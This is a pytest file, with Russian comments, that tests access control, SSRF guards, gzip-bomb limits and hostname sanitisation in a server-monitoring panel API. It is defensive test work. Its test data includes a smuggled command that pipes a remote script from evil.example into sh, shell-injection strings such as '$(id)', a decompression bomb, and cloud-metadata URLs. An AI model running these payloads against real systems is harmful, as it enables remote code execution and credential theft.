"""Доступы и проверка входных данных API: группы учеток, роли, что отдается учетке только для
просмотра, и что принимается от ноды. Каждый тест - одна закрытая дыра."""
import gzip
import json
from datetime import datetime, timezone
from types import SimpleNamespace

import httpx
import pytest

PW = "access-pass-2026"


async def _login(client, name: str) -> dict:
    r = await client.post("/api/auth/login", json={"username": name, "password": PW})
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


async def _user(client, auth_headers, name: str, role: str = "editor", **extra) -> dict:
    r = await client.post("/api/users", json={"username": name, "password": PW, "role": role, **extra},
                          headers=auth_headers)
    assert r.status_code == 201, r.text
    return await _login(client, name)


async def _server(client, headers, name: str, group: str = "") -> tuple[int, dict]:
    r = await client.post("/api/servers", json={"name": name, "group_name": group}, headers=headers)
    assert r.status_code == 201, r.text
    return r.json()["server"]["id"], {"Authorization": f"Bearer {r.json()['token']}"}


def _report(**kw) -> dict:
    return {"hostname": "node-a", "agent_version": "2.60", "cpu_percent": 1, "mem_used": 1, "mem_total": 2,
            "disks": [], **kw}


# ---------------------------------------------------------------- отчет агента


async def test_gzip_body_needs_a_known_token_before_unpacking(client, auth_headers):
    """Сжатое тело распаковывается только для известного токена и только до 8 МБ: раньше любой из
    интернета клал бэкенд gzip-бомбой до проверки токена."""
    _, ah = await _server(client, auth_headers, "node-a")
    gz = {"Content-Type": "application/json", "Content-Encoding": "gzip"}
    bomb = gzip.compress(b"0" * (40 * 1024 * 1024))  # 40 МБ нулей, сжато ~40 КБ
    r = await client.post("/api/agent/report", content=bomb, headers=gz)
    assert r.status_code == 401
    r = await client.post("/api/agent/report", content=bomb,
                          headers={**gz, "Authorization": "Bearer fake-token-example"})
    assert r.status_code == 401
    r = await client.post("/api/agent/report", content=bomb, headers={**gz, **ah})
    assert r.status_code == 413
    # обычный сжатый отчет со своим токеном - как раньше
    r = await client.post("/api/agent/report", content=gzip.compress(json.dumps(_report()).encode()),
                          headers={**gz, **ah})
    assert r.status_code == 200, r.text
    # несжатое тело middleware не трогает
    r = await client.post("/api/agent/report", json=_report(), headers=ah)
    assert r.status_code == 200


def test_gunzip_limit():
    from app import gzip_request
    assert gzip_request._gunzip(gzip.compress(b"x" * 1000)) == b"x" * 1000
    assert gzip_request._gunzip(gzip.compress(b"x" * (gzip_request._MAX_DECOMPRESSED + 1))) is None
    assert gzip_request._gunzip(b"not gzip") == b"not gzip"  # битое - дальше, валидатор ответит 422


async def test_bad_hostname_from_node_is_not_kept(client, auth_headers):
    """Имя хоста от ноды уходит в команду ansible (-l <hostname>): с `;` и пробелами не берем."""
    sid, ah = await _server(client, auth_headers, "node-a")
    assert (await client.post("/api/agent/report", json=_report(hostname="node-a.example"), headers=ah)).status_code == 200
    srv = (await client.get(f"/api/servers/{sid}", headers=auth_headers)).json()
    assert srv["hostname"] == "node-a.example"
    bad = "x;curl -s https://evil.example/x|sh;#"
    r = await client.post("/api/agent/report", json=_report(hostname=bad), headers=ah)
    assert r.status_code == 200  # отчет не теряется
    srv = (await client.get(f"/api/servers/{sid}", headers=auth_headers)).json()
    assert srv["hostname"] == "node-a.example" and srv["last_report"]["hostname"] == ""
    assert bad not in json.dumps(srv)


def test_safe_hostname():
    from app.schemas import safe_hostname
    assert safe_hostname("web-1.example.com") == "web-1.example.com"
    for bad in ("x;rm", "a b", "$(id)", "-l", "", "a" * 300, "x|sh", "`id`", "a'b"):
        assert safe_hostname(bad) == "", bad


# ---------------------------------------------------------------- проверка изнутри и SSRF


async def test_local_probe_only_reads(client, auth_headers):
    """Проверка изнутри идет на localhost ноды: только GET/HEAD, порт не 80/443 - только админ."""
    eh = await _user(client, auth_headers, "ed")
    base = {"name": "s", "type": "http", "probe_local": True}
    r = await client.post("/api/checks", json={**base, "target": "https://shop.example/", "method": "POST"},
                          headers=eh)
    assert r.status_code == 400
    r = await client.post("/api/checks", json={**base, "target": "http://shop.example:2375/containers/db/json"},
                          headers=eh)
    assert r.status_code == 403
    r = await client.post("/api/checks", json={**base, "target": "https://shop.example/"}, headers=eh)
    assert r.status_code == 201, r.text
    cid = r.json()["id"]
    r = await client.patch(f"/api/checks/{cid}", json={"target": "http://shop.example:2019/stop"}, headers=eh)
    assert r.status_code == 403
    r = await client.patch(f"/api/checks/{cid}", json={"method": "PUT"}, headers=eh)
    assert r.status_code == 400
    # админ ставит сайт на нестандартном порту
    r = await client.post("/api/checks", json={**base, "target": "https://shop.example:8443/"}, headers=auth_headers)
    assert r.status_code == 201, r.text
    # пробная проверка изнутри - тем же правилам
    r = await client.post("/api/checks/try", json={"part": "inside", "type": "http", "method": "POST",
                                                   "target": "https://shop.example/"}, headers=eh)
    assert r.status_code == 400


def test_agent_task_never_writes():
    from app import manual_probe
    chk = SimpleNamespace(id=1, target="http://d.example/x", method="POST", timeout_ms=1000, interval_seconds=60,
                          expected_status="200", keyword_up="", keyword_down="", http_headers="",
                          auth_method="", auth_user="", auth_pass="", ignore_tls=False)
    assert manual_probe.site_probe_task(chk, 1)["method"] == "GET"
    chk.method = "HEAD"
    assert manual_probe.site_probe_task(chk, 1)["method"] == "HEAD"


async def test_inside_probe_skips_odd_ports():
    from app import inside_probe
    chk = SimpleNamespace(type="http", probe_local=False, target="http://d.example:2375/containers/json",
                          last_inside=None)
    assert await inside_probe.request(None, chk, datetime.now(timezone.utc)) is False


def test_probe_node_sticks_and_does_not_pick_across_groups():
    """Нода сама пишет себе домены (web_services): взломанная могла вписать чужой и забрать монитор."""
    from app.collector import _probe_node
    groups = {1: "a", 2: "b", 3: "a"}
    assert _probe_node([], None, groups) is None
    assert _probe_node([2], None, groups) == 2
    # уже привязан к ноде 2, домен "появился" у ноды 1 из другой группы: привязка не уходит
    assert _probe_node([1, 2], 2, groups) == 2
    # новый монитор, кандидаты из разных групп: никого, человек разберется
    assert _probe_node([1, 2], None, groups) is None
    # балансируемые узлы одной группы: первый по имени, как раньше
    assert _probe_node([1, 3], None, groups) == 1


async def test_monitor_targets_inside_network_admin_only(client, auth_headers):
    """Монитор - запрос с хоста панели: метаданные облака никому, внутренняя сеть - только админу."""
    eh = await _user(client, auth_headers, "ed")
    for target in ("http://169.254.169.254/latest/user-data", "http://metadata.google.internal/"):
        r = await client.post("/api/checks", json={"name": "m", "type": "http", "target": target}, headers=auth_headers)
        assert r.status_code == 400, target
    for body in ({"type": "http", "target": "http://10.0.0.5/"}, {"type": "tcp_port", "target": "db", "port": 5432},
                 {"type": "http", "target": "http://localhost:8000/"}):
        r = await client.post("/api/checks", json={"name": "m", **body}, headers=eh)
        assert r.status_code == 403, body
        r = await client.post("/api/checks/try", json={"part": "panel", **body}, headers=eh)
        assert r.status_code == 403, body
    r = await client.post("/api/checks", json={"name": "m", "type": "http", "target": "http://127.0.0.1:1/"},
                          headers=auth_headers)
    assert r.status_code == 201
    # DNS-монитор с резолвером на метаданных
    r = await client.post("/api/checks/import", json={"items": [
        {"name": "d", "type": "dns", "target": "example.com", "dns_server": "169.254.169.254"}]}, headers=eh)
    assert r.status_code in (400, 422)
    # прокси локации проверяет только админ: адрес прокси - любой хост и порт
    r = await client.post("/api/locations/test", json={"url": "http://10.0.0.5:3128"}, headers=eh)
    assert r.status_code == 403


async def test_redirect_into_inside_network_is_not_followed():
    from app import net_guard
    hook = net_guard.request_hook()
    await hook(httpx.Request("GET", "https://93.184.216.34/"))
    with pytest.raises(httpx.ConnectError):
        await hook(httpx.Request("GET", "http://10.0.0.5/admin"))
    with pytest.raises(httpx.ConnectError):
        await net_guard.request_hook()(httpx.Request("GET", "http://169.254.169.254/"))
    # монитор админа на внутренний адрес: редирект внутри сети идет
    inner = net_guard.request_hook()
    await inner(httpx.Request("GET", "http://10.0.0.5/"))
    await inner(httpx.Request("GET", "http://10.0.0.6/"))
    assert net_guard.ip_class("::ffff:169.254.169.254") == net_guard.FORBIDDEN
    assert net_guard.ip_class("100.64.0.1") == net_guard.INTERNAL
    assert net_guard.ip_class("8.8.8.8") == net_guard.PUBLIC


async def test_tcp_and_cert_monitor_refuse_metadata():
    from app import checks
    out = await checks._run_tcp_port(SimpleNamespace(target="169.254.169.254", port=80, timeout_ms=1000,
                                                     degraded_ms=500))
    assert out.status == "down" and "метаданные" in out.message
    days, msg = await checks._ssl_probe("169.254.169.254", 443, 1.0)
    assert days is None and "метаданные" in msg


# ---------------------------------------------------------------- группы учеток


async def test_groups_on_monitors(client, auth_headers):
    eh = await _user(client, auth_headers, "ed", site_groups=["web"])
    mine = (await client.post("/api/checks", json={"name": "a", "type": "http", "target": "https://a.example/",
                                                   "group_name": "web"}, headers=eh)).json()
    other = (await client.post("/api/checks", json={"name": "b", "type": "http", "target": "https://b.example/",
                                                    "group_name": "shop"}, headers=auth_headers)).json()
    # перенос своего монитора в чужую группу: алерты ушли бы ее получателям
    r = await client.patch(f"/api/checks/{mine['id']}", json={"group_name": "shop"}, headers=eh)
    assert r.status_code == 403
    # инциденты чужого монитора и чужие домены не видны
    r = await client.get(f"/api/checks/incidents?check_id={other['id']}", headers=eh)
    assert r.status_code == 404
    assert all(x["check_id"] != other["id"] for x in (await client.get("/api/checks/incidents", headers=eh)).json())
    known = (await client.get("/api/checks/known-hosts", headers=eh)).json()
    assert "b.example" not in known["hosts"] and "shop" not in known["groups"]


async def test_groups_on_servers(client, auth_headers):
    eh = await _user(client, auth_headers, "ed", server_groups=["web"])
    r = await client.post("/api/servers", json={"name": "planted", "group_name": "db"}, headers=eh)
    assert r.status_code == 403
    sid, _ = await _server(client, eh, "web-1", "web")
    r = await client.patch(f"/api/servers/{sid}", json={"group_name": "db"}, headers=eh)
    assert r.status_code == 403
    await _server(client, auth_headers, "secret-db", "db")
    r = await client.post("/api/servers", json={"name": "secret-db", "group_name": "web"}, headers=eh)
    assert r.status_code == 409 and "secret-db" not in r.json()["detail"]
    # сервер бэкапов чужой группы для настройки бэкапа - "не найден"
    bs, _ = await _server(client, auth_headers, "bk-1", "db")
    r = await client.post(f"/api/servers/{sid}/backup/setup", json={"backup_server_id": bs}, headers=eh)
    assert r.status_code == 404


# ---------------------------------------------------------------- роли


async def test_dump_dir_rules(client, auth_headers):
    """Каталог дампов: системные деревья нельзя никому, не /backup - только админ."""
    eh = await _user(client, auth_headers, "ed")
    sid, _ = await _server(client, auth_headers, "db-1")
    url = f"/api/servers/{sid}/backup/command"
    for bad in ("/var/lib", "/etc", "/usr/local", "/home", "/tmp/x", "/var/lib/mysql"):
        r = await client.post(url, json={"action": "dump_setup", "engine": "mysql", "dump_dir": bad},
                              headers=auth_headers)
        assert r.status_code == 422, bad
    r = await client.post(url, json={"action": "dump_setup", "engine": "mysql", "dump_dir": "/srv/dumps"}, headers=eh)
    assert r.status_code == 403
    for ok in ("", "/backup", "/backup/db"):
        r = await client.post(url, json={"action": "dump_setup", "engine": "mysql", "dump_dir": ok}, headers=eh)
        assert r.status_code == 200, (ok, r.text)
    r = await client.post(url, json={"action": "dump_setup", "engine": "mysql", "dump_dir": "/srv/dumps"},
                          headers=auth_headers)
    assert r.status_code == 200


async def test_viewer_without_logs_gets_no_log_lines(client, auth_headers):
    sid, ah = await _server(client, auth_headers, "node-a")
    rep = _report(procs=[{"pid": 1, "comm": "mysqld", "cmdline": "mysqld --password=fakepass", "cpu": 1, "rss": 1}],
                  extras={"logerr": {"v": 1, "sources": [{"where": "web", "last": "token=fakepass"}]}})
    assert (await client.post("/api/agent/report", json=rep, headers=ah)).status_code == 200
    vh = await _user(client, auth_headers, "watcher", role="viewer")
    for path in (f"/api/servers/{sid}", "/api/servers"):
        assert "fakepass" not in (await client.get(path, headers=vh)).text, path
    r = await client.get(f"/api/servers/{sid}/web-errors/lines?key=x", headers=vh)
    assert r.status_code == 403
    # с галкой и у editor - как раньше
    lv = await _user(client, auth_headers, "reader", role="viewer", can_read_logs=True)
    assert "fakepass" in (await client.get(f"/api/servers/{sid}", headers=lv)).text
    assert "fakepass" in (await client.get(f"/api/servers/{sid}", headers=auth_headers)).text


async def test_viewer_sees_monitor_address_without_secrets(client, auth_headers):
    r = await client.post("/api/checks", json={"name": "a", "type": "http", "auth_user": "bob",
                                               "target": "https://bob:fakepass@a.example/x?token=fake-token-example&p=1"},
                          headers=auth_headers)
    cid = r.json()["id"]
    vh = await _user(client, auth_headers, "watcher", role="viewer")
    for path in ("/api/checks", f"/api/checks/{cid}", "/api/checks/overview"):
        body = (await client.get(path, headers=vh)).text
        assert "fakepass" not in body and "fake-token-example" not in body and '"bob"' not in body, path
    assert "fakepass" in (await client.get(f"/api/checks/{cid}", headers=auth_headers)).text


async def test_agent_ip_is_one_address(client, auth_headers, tmp_path):
    from app import config
    r = await client.post("/api/servers", json={"name": "a", "agent_ip": "0.0.0.0/0"}, headers=auth_headers)
    assert r.status_code == 422
    sid, _ = await _server(client, auth_headers, "b")
    for bad in ("0.0.0.0/0", "10.0.0.0/8", "0.0.0.0", "1.2.3.4 5.6.7.8"):
        r = await client.patch(f"/api/servers/{sid}", json={"agent_ip": bad}, headers=auth_headers)
        assert r.status_code == 422, bad
    r = await client.patch(f"/api/servers/{sid}", json={"agent_ip": " 203.0.113.7 "}, headers=auth_headers)
    assert r.status_code == 200 and r.json()["agent_ip"] == "203.0.113.7"
    data = config.get_settings().data_dir
    with open(f"{data}/agent_allow_ips", encoding="utf-8") as fh:
        assert fh.read() == "203.0.113.7\n"


def test_firewall_script_takes_single_addresses():
    from pathlib import Path
    src = (Path(__file__).resolve().parents[2] / "ops" / "agent-firewall-sync.sh").read_text(encoding="utf-8")
    desired = src[src.index("DESIRED=$("):src.index("OPENED=$(")]
    assert "/" not in desired.split("grep -E")[1].split("|")[0] and "\r" not in src


async def test_snooze_web_5xx_whole_kind(client, auth_headers):
    """Снуз "Веб: ошибки 5xx" целиком: паттерн не пропускал цифру в типе."""
    sid, _ = await _server(client, auth_headers, "web-1")
    for kind in ("web_5xx", "web_5xx@2", "web_5xx:shop.example"):
        r = await client.post(f"/api/servers/{sid}/snooze-alert", json={"kind": kind, "hours": 2},
                              headers=auth_headers)
        assert r.status_code == 200, (kind, r.text)


# ---------------------------------------------------------------- вход


async def test_token_of_deleted_user_does_not_fit_new_one(client, auth_headers):
    h = await _user(client, auth_headers, "same", role="viewer")
    uid = (await client.get("/api/auth/me", headers=h)).json()["id"]
    # иначе SQLite отдаст новой учетке тот же номер (последний удаленный); в Postgres номера не повторяются
    await _user(client, auth_headers, "filler", role="viewer")
    assert (await client.delete(f"/api/users/{uid}", headers=auth_headers)).status_code in (200, 204)
    r = await client.post("/api/users", json={"username": "same", "password": PW, "role": "editor"},
                          headers=auth_headers)
    assert r.status_code == 201
    assert (await client.get("/api/auth/me", headers=h)).status_code == 401


async def test_logout_revokes_token(client, auth_headers):
    h = await _user(client, auth_headers, "ed")
    assert (await client.post("/api/auth/logout", headers=h)).status_code == 204
    assert (await client.get("/api/auth/me", headers=h)).status_code == 401


async def test_password_and_2fa_guesses_are_limited(client, auth_headers):
    h = await _user(client, auth_headers, "ed")
    codes = [(await client.post("/api/auth/password", json={"current_password": f"wrong-{i}-xxxxxx",
                                                            "new_password": "fake-another-pass"}, headers=h)).status_code
             for i in range(12)]
    assert codes[0] == 400 and codes[-1] == 429


# ---------------------------------------------------------------- связь между серверами


async def test_links_only_to_fleet(client, auth_headers):
    eh = await _user(client, auth_headers, "ed")
    sid, _ = await _server(client, auth_headers, "vpn-in")
    other, oh = await _server(client, auth_headers, "vpn-out")
    await client.patch(f"/api/servers/{other}", json={"agent_ip": "203.0.113.9"}, headers=auth_headers)
    for host in ("127.0.0.1", "169.254.169.254", "localhost"):
        r = await client.post(f"/api/servers/{sid}/links", json={"host": host, "port": 22}, headers=auth_headers)
        assert r.status_code == 400, host
    r = await client.post(f"/api/servers/{sid}/links", json={"host": "10.0.0.5", "port": 5432}, headers=eh)
    assert r.status_code == 403
    r = await client.post(f"/api/servers/{sid}/links", json={"host": "203.0.113.9", "port": 443}, headers=eh)
    assert r.status_code == 201, r.text
    r = await client.post(f"/api/servers/{sid}/links", json={"host": "10.0.0.5", "port": 5432}, headers=auth_headers)
    assert r.status_code == 201


def test_backup_audit_gb_binary():
    from app import backup_growth
    assert backup_growth.fmt_size(200 * 2**30) == "200 ГБ"
